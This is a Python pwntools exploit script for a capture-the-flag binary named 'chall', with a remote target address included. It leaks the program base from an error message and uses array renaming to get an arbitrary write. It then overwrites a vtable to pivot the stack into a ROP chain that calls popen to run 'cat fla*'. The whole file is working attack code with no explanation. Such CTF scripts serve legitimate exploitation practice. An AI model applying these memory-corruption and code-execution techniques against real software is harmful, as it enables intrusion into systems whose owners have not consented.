#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

elf = ELF('./chall')

context.binary = elf

ENCODING = 'ISO-8859-1'
s = lambda senddata : p.send(senddata.encode(ENCODING))
sa = lambda recvdata, senddata : p.sendafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
sl = lambda senddata : p.sendline(senddata.encode(ENCODING))
sla = lambda recvdata, senddata : p.sendlineafter(recvdata.encode(ENCODING), senddata.encode(ENCODING))
r = lambda numb=0x3f3f3f3f, timeout=0x3f3f3f3f : p.recv(numb, timeout=timeout).decode(ENCODING)
ru = lambda recvdata, timeout=0x3f3f3f3f : p.recvuntil(recvdata.encode(ENCODING), timeout=timeout).decode(ENCODING)
uu32 = lambda data : u32(data.encode(ENCODING), signed='unsigned')
uu64 = lambda data : u64(data.encode(ENCODING), signed='unsigned')
iu32 = lambda data : u32(data.encode(ENCODING), signed='signed')
iu64 = lambda data : u64(data.encode(ENCODING), signed='signed')
up32 = lambda data : p32(data, signed='unsigned').decode(ENCODING)
up64 = lambda data : p64(data, signed='unsigned').decode(ENCODING)
ip32 = lambda data : p32(data, signed='signed').decode(ENCODING)
ip64 = lambda data : p64(data, signed='signed').decode(ENCODING)

local = 1
if local:
    p = process([elf.path])
else:
    p = remote('124.16.75.162', 31020)

def new(name, vlist):
    sla('> ', '1')
    sla('Name: ', name)
    sla('Number of arr: ', str(len(vlist)))
    for i in range(len(vlist)):
        sla('] = ', str(vlist[i]))

def rename(old_name, new_name, c):
    sla('> ', '2')
    sla('(old) Name: ', old_name)
    sla('(new) Name: ', new_name)
    sla('[y/N]: ', c)

def edit(name, idx, val):
    sla('> ', '3')
    sla('Name: ', name)
    sla('Index: ', str(idx))
    sla('] = ', str(val))

def delete(name):
    sla('> ', '4')
    sla('Name: ', name)

# leak elf
delete('A')
ru('??:? _Dmain [')
elf_base = int(r(14)[2:], 16) - 0x9fb24
info('elf_base = ' + hex(elf_base))

# arbitrary write
new('A', [0xdeadbeef] * 3)
new('C', [0x12345678] * 3)
rename('A', 'C', 'n') # empty A

def write(addr, val):
    edit('A', int(addr / 8), val)

popen_plt = elf_base + elf.plt['popen']
# 0x00000000000b9365 : push rsi ; or byte ptr [rax - 0x75], cl ; pop rsp ; and al, 8 ; add rsp, 0x28 ; ret
stack_pivot_ret = elf_base + 0x00000000000b9365
buffer_addr = elf_base + 0x160100
target_addr = elf_base + 0x0000000000146800
fake_stack_addr = elf_base + 0x148830
pop_rdi_ret = elf_base + 0x00000000000f1f9d
pop_rsi_r15_ret = elf_base + 0x00000000001177a1

# fake vtable
write(buffer_addr + 0x60, stack_pivot_ret)

# write rop chain
cat_flag_addr = elf_base + 0x148888
w_addr = elf_base + 0x148898
payload = up64(pop_rdi_ret)
payload += up64(cat_flag_addr)
payload += up64(pop_rsi_r15_ret)
payload += up64(w_addr)
payload += up64(0)
payload += up64(popen_plt)
payload += 'cat fla*'
payload += up64(0)
payload += 'w\x00'.ljust(8, '\x00')
for i in range(0, len(payload), 8):
    write(fake_stack_addr + 0x28 + i, uu64(payload[i:i+8]))

# write vtable
write(target_addr, buffer_addr)

#gdb.attach(p, 'pie breakpoint 0x00000000000CEED2\nc')

# trigger rop chain
delete('233')

p.interactive()

